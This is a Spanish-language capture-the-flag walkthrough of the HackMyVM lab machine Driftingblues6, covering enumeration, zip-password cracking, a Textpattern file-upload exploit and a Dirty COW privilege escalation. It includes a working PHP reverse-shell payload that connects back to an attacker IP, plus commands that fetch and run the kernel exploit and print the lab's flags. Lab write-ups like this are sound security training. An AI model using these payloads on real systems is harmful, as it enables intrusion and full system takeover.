---
icon: flag
---

# Driftingblues6 HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-09 02:56 EDT
Nmap scan report for 192.168.1.171
Host is up (0.00040s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: driftingblues
| http-robots.txt: 1 disallowed entry 
|_/textpattern/textpattern
MAC Address: 08:00:27:81:73:9F (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
```

Veremos una pagina web alojada en el puerto `80` y si entramos dentro no veremos gran cosa, pero si probamos a ir al `robots.txt` veremos que si esta alojado y veremos lo siguiente:

```
User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)
```

Veremos que hay una ruta en:

```
URL = http://<IP>/textpattern/textpattern
```

Si entramos aqui veremos que hay un `login` viendo lo siguiente:

<figure><img src="../../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

Pero nos tendremos las credenciales para poder ingresar, por lo que vamos a seguir buscando, haciendo un poco de `fuzzing` ya que anteriormente nos comento que pusieramos la extension `.zip`, por lo que vamos a hacerlo.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt,zip -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.171/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,zip
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 286]
/.php                 (Status: 403) [Size: 285]
/index.html           (Status: 200) [Size: 750]
/index                (Status: 200) [Size: 750]
/db                   (Status: 200) [Size: 53656]
/robots               (Status: 200) [Size: 110]
/robots.txt           (Status: 200) [Size: 110]
/spammer.zip          (Status: 200) [Size: 179]
/spammer              (Status: 200) [Size: 179]
/.html                (Status: 403) [Size: 286]
/.php                 (Status: 403) [Size: 285]
/server-status        (Status: 403) [Size: 294]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos un archivo interesante llamado `/spammer.zip` y si entramos a dicho archivo nos lo descargara, por lo que vamos a intentar descomprimirlo.

```shell
unzip spammer.zip
```

Nos pedira una contraseña, por lo que vamos a intentar `crackearlo` de la siguiente forma:

```shell
zip2john spammer.zip > hash.zip
```

```shell
john --wordlist=<WORDLIST> hash.zip
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
myspace4         (spammer.zip/creds.txt)     
1g 0:00:00:00 DONE (2025-04-09 03:16) 33.33g/s 682666p/s 682666c/s 682666C/s christal..michelle4
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado y obtendremos la contraseña para poder descomprimirlo `myspace4`:

```shell
unzip spammer.zip
```

Metemos como contraseña `myspace4` y veremos que nos ha descomprimido un archivo llamado `creds.txt`.

```shell
cat creds.txt
```

Info:

```
mayer:lionheart
```

Puede ser que sean credenciales para el `login` que nos encontramos anteriormente, por lo que vamos a probar a meterlas.

Veremos que si nos deja y estaremos dentro del panel, pero si vemos que version de `software` tiene este programa, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>

Vamos a probar a buscar un `exploit` para ver si esta version es vulnerable.

Si buscamos un poco veremos que si hay una `vulnerabilidad` asociada a dicho `software`, la cosa es que hay que esta `autenticado` para realizar dicho `exploit` y como lo estamos pues podremos explotarlo.

URL = [ExploitDB RCE Textpattern CMS](https://www.exploit-db.com/exploits/48943)

Vemos que en el codigo la seccion vulnerable es en la subida de archivos, nos tendremos que ir `Content` -> `Files`, dentro de esta seccion subiremos un archivo que sera el siguiente:

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

<figure><img src="../../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

Una vez que lo hayamos subido veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

Vemos que se ha subido de forma correcta, por lo que nos vamos a poner a la escucha de la siguiente forma:

```shell
nc -lvnp <PORT>
```

Ahora en la pagina nos iremos a la siguiente ruta donde se alojan todos estos archivos:

```
URL = http://<IP>/textpattern/files/
```

Y veremos que esta el archivo que hemos subido:

<figure><img src="../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

Ahora si clicamos en `shell.php` y si volvemos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.171] 44902
whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si vemos la version del `kernel` veremos lo siguiente:

```shell
uname -r
```

Info:

```
3.2.0-4-amd64
```

Vamos a ver si fuera vulnerable al `dirty cow`.

URL = [ExploitDB Vuln Kernel Dirty Cow](https://www.exploit-db.com/exploits/40839)

Veremos que si es vulnerable, por lo que vamos a descargarnos el archivo `.c` y nos lo pasaremos a la maquina victima para compilarlo ya que tenemos el `gcc` instalado tambien.

```shell
python3 -m http.server 8000
```

En la maquina victima nos lo descargaremos:

```shell
cd /tmp
wget http://<IP>:8000/40839.c
```

Una vez que nos lo hayamos descargado ejecutaremos lo siguiente:

```shell
gcc -pthread 40839.c -o dirty -lcrypt
```

Una vez compilado, lo ejecutaremos de la siguiente forma proporcionando la contraseña que queramos.

```shell
./dirty 1234
```

Info:

```
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 1234
Complete line:
firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash

mmap: 7f4781448000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '1234'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
www-data@driftingblues:/tmp$ madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '1234'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

Veremos que se ha realizado de forma correcta, por lo que haremos lo siguiente:

```shell
su firefart
```

Metemos como contraseña `1234` y veremos que seremos dicho usuario.

```
whoami
whoami
firefart
firefart@driftingblues:/var/www/textpattern/files# id
id
uid=0(firefart) gid=0(root) groups=0(root)
```

Veremos que ya tendremos los privilegios de `root` directamente ya que es una vulnerabilidad de `kernel` y todo se ejecuta con privilegios elevados, por lo que leeremos las `flags` de usuario y `root`.

> user.txt

```
5355B03AF00225CFB210AE9CA8931E51
```

> root.txt

```
CCAD89B795EE7BCF7BBAD5A46F40F488
```
